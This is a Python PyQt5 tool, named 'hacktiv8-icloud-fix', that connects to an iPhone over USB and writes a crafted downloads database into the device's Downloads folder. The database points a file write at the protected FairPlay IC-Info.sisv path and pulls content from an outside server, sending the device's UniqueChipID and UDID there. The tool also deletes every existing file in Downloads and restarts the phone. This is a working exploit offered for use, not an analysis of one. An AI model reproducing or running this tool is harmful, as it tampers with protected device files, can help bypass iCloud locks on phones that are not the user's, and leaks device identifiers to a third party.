import sys
import os
import time
import sqlite3
import tempfile

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget,
    QVBoxLayout, QPushButton, QLabel, QMessageBox
)
from PyQt5.QtCore import QThread, pyqtSignal, QTimer

from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.afc import AfcService
from pymobiledevice3.services.diagnostics import DiagnosticsService

BACKEND_URL = 'http://overcast302.dev/hacktiv8/icinfo.php'

# pyinstaller resource path fix
def resource_path(name):
    base = getattr(sys, '_MEIPASS', os.path.abspath('.'))
    return os.path.join(base, name)

def build_db_from_sql(sql_path, backend_url, target_path):
    with open(sql_path, 'r', encoding='utf-8') as f:
        sql = f.read()

    sql = sql.replace('BACKEND_URL', backend_url).replace('TARGET_PATH', target_path)

    tmp = tempfile.NamedTemporaryFile(delete=False)
    tmp.close()

    try:
        con = sqlite3.connect(tmp.name)
        con.executescript(sql)
        con.commit()
        con.close()

        with open(tmp.name, 'rb') as f:
            return f.read()
    finally:
        os.unlink(tmp.name)

class ICInfoInjectionThread(QThread):
    status = pyqtSignal(str)
    success = pyqtSignal(str)
    error = pyqtSignal(str)

    def wait_for_device(self, timeout=160):
        deadline = time.monotonic() + timeout

        while time.monotonic() < deadline:
            try:
                lockdown = create_using_usbmux()
                DiagnosticsService(lockdown=lockdown).mobilegestalt(
                    keys=['ProductType']
                )
                return lockdown
            except Exception:
                time.sleep(2)

        raise TimeoutError()

    def push_payload(self, lockdown, payload_db):
        with AfcService(lockdown=lockdown) as afc:
            for filename in afc.listdir('Downloads'):
                afc.rm('Downloads/' + filename)
            time.sleep(3)

            afc.set_file_contents(
                'Downloads/downloads.28.sqlitedb',
                payload_db
            )
        DiagnosticsService(lockdown=lockdown).restart()
        return self.wait_for_device()

    def run(self):
        try:
            lockdown = create_using_usbmux()
            values = lockdown.get_value()

            sql_path = resource_path('payload.sql')

            ucid = values.get('UniqueChipID')
            udid = values.get('UniqueDeviceID')
            ic_info_url = f'{BACKEND_URL}?ucid={ucid}&udid={udid}'
            ic_info_payload = build_db_from_sql(
                sql_path,
                ic_info_url,
                '/private/var/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv'
            )

            self.status.emit('Writing IC-Info...')
            lockdown = self.push_payload(lockdown, ic_info_payload)
            time.sleep(10)

            DiagnosticsService(lockdown=lockdown).restart()
            self.success.emit('Done!')
            return

        except TimeoutError:
            self.error.emit(
                'Device did not reconnect in time. Please ensure it is connected and try again.'
            )
        except Exception as e:
            self.error.emit(repr(e))


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()

        self.setWindowTitle(f'hacktiv8-icloud-fix 0001')
        self.setFixedSize(500, 200)

        self.status = QLabel('No device connected')

        self.icinfo = QPushButton('Fix iCloud Login')
        self.icinfo.setEnabled(False)

        layout = QVBoxLayout()
        layout.addWidget(self.status)
        layout.addWidget(self.icinfo)

        container = QWidget()
        container.setLayout(layout)
        self.setCentralWidget(container)

        self.icinfo.clicked.connect(self.start_icinfo_injection)

        self.timer = QTimer(self)
        self.timer.timeout.connect(self.poll_device)
        self.timer.start(1000)

    def poll_device(self):
        try:
            lockdown = create_using_usbmux()
            values = lockdown.get_value()

            product = values.get('ProductType')
            version = values.get('ProductVersion')

            self._set_state(f'Connected: {product} ({version})', True)

        except Exception:
            self._set_state('No device connected', False)

    def _set_state(self, text, enabled):
        self.status.setText(text)
        self.icinfo.setEnabled(enabled)

    def start_icinfo_injection(self):
        ret = QMessageBox.warning(
            self,
            'Info',
            'Warning: This feature relies on non-free software and exposes unique device information to a third-party server. Proceed with caution.',
            QMessageBox.Ok | QMessageBox.Cancel
        )
        if ret != QMessageBox.Ok:
            return
        
        QMessageBox.information(
            self,
            'Info',
            'Your device iCloud login will now be fixed. Please ensure it is connected to Wi-Fi.'
        )

        self.timer.stop()
        self.icinfo.setEnabled(False)

        self.worker = ICInfoInjectionThread()
        self.worker.status.connect(self.status.setText)
        self.worker.success.connect(self.on_success)
        self.worker.error.connect(self.on_error)
        self.worker.start()



    def on_success(self, msg):
        self.status.setText(msg)
        QMessageBox.information(self, 'Success', msg)
        self.icinfo.setEnabled(True)
        self.timer.start(1000)

    def on_error(self, msg):
        QMessageBox.critical(self, 'Error', msg)
        self.status.setText('Error occurred')
        self.timer.start(1000)


if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec())